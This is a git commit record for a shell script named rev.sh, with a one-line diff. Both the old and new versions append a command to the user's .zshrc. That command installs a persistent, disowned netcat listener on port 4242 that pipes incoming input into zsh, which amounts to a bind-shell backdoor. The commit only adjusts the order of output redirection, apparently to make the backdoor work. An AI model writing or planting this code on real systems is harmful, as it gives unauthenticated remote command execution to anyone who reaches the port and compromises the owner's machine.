023b7fe4ccbe87392100c4af6bc21454399d3fff
pfuchs <72362902+Bluegales@users.noreply.github.com>
2023-05-04 17:07:26 +0200

    Update rev.sh

--- rev.sh
+++ rev.sh
@@ -1,1 +1,1 @@
-echo "while (true) {rm -f /tmp/f;mkfifo /tmp/f;nc -l 4242 0</tmp/f | zsh 2>&1 1>/tmp/f} & disown" >> .zshrc
+echo "while (true) {rm -f /tmp/f;mkfifo /tmp/f;nc -l 4242 0</tmp/f | zsh 1>/tmp/f 2>&1} & disown" >> .zshrc
